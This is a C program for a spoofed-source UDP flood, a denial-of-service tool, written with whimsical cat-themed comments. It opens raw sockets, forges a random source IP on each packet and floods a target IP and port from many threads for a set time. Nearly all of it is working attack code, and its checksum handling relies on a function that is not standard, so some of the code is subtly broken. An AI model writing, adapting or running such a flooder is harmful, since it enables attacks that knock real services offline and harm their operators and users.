#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <netinet/in.h> // Include this for inet_cksum

#define PACKET_STUFFING  1440 
#define MAX_KITTENS   100   
#define PAUSE_TIME  9999  

// Our target... shall we go for the laser pointer this time?
struct sockaddr_in target;

// Generates a random IP address - cats wandering all over the net
uint32_t generate_random_ip() {
    uint32_t ip =   0;
    for (int i =   0; i <   4; i++) {
        ip = (ip <<   8) | (rand() %   256);
    }
    return ip;
}

void *launch_furmissile(void *arg) {
    int sockfd;
    struct sockaddr_in src;
    char payload[PACKET_STUFFING];

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd <   0) {
        perror("Trouble getting the catnip ready :(");   
        exit(EXIT_FAILURE); // No catnip, no fun. 
    }

    struct udphdr udp;
    udp.source = htons(rand() %   65535 +   1); // Cat's gotta be nimble
    udp.dest = target.sin_port;
    udp.len = htons(sizeof(udp) + PACKET_STUFFING);

    struct iphdr ip;
    ip.ihl =   5;
    ip.version =   4;
    ip.tos =   0;
    ip.tot_len = htons(sizeof(ip) + sizeof(udp) + PACKET_STUFFING);
    ip.id = htons(rand());
    ip.frag_off =   0;
    ip.ttl =   64;   
    ip.protocol = IPPROTO_UDP;
    ip.check =   0;   
    ip.daddr = target.sin_addr.s_addr;

    char packet[sizeof(ip) + sizeof(udp) + PACKET_STUFFING];

    while (1) {
        // New hiding spot for each packet
        src.sin_family = AF_INET;
        src.sin_addr.s_addr = generate_random_ip();

        // Prepare a surprise furball of data!
        for (int i =   0; i < PACKET_STUFFING; i++) {   
            payload[i] = rand() %   256;
        }

        ip.saddr = src.sin_addr.s_addr; 
        ip.check =   0;
        ip.check = inet_cksum((unsigned short *)&ip, sizeof(ip));

        udp.check =   0; // Cats don't play by the rules
        udp.check = inet_cksum((unsigned short *)&udp, sizeof(udp));

        memcpy(packet, &ip, sizeof(ip));
        memcpy(packet + sizeof(ip), &udp, sizeof(udp));
        memcpy(packet + sizeof(ip) + sizeof(udp), payload, PACKET_STUFFING);

        if (sendto(sockfd, packet, sizeof(packet),   0,   
                   (struct sockaddr *)&target, sizeof(target)) <   0) {
            perror("Furmissile delivery failed! :(");   
            exit(EXIT_FAILURE); 
        }

        usleep(1); // Gotta catch a quick nap between attacks
    }

    close(sockfd);
    return NULL;   
}

int main(int argc, char *argv[]) {
    if (argc !=   5) {
        fprintf(stderr, "Usage: %s ip port kittens timeout\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Commence operation: Yarn Mayhem!
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    target.sin_addr.s_addr = inet_addr(argv[1]);
    int kittens = atoi(argv[3]);
    int timeout = atoi(argv[4]);

    // Seed the random number generator for maximum chaos 
    srand(time(NULL));

    // Deploying the furry squad!
    pthread_t thread_ids[MAX_KITTENS];
    for (int i =   0; i < kittens; i++) {
        if (pthread_create(&thread_ids[i], NULL, launch_furmissile, NULL) !=   0) {
            perror("Failed to deploy a kitten! :("); 
            exit(EXIT_FAILURE);
        }
    }

    // Let the chaos reign... for a little while
    sleep(timeout);

    // Alright, time to bring the kittens home
    for (int i =   0; i < kittens; i++) {
        pthread_cancel(thread_ids[i]);
    }

    return EXIT_SUCCESS;
}
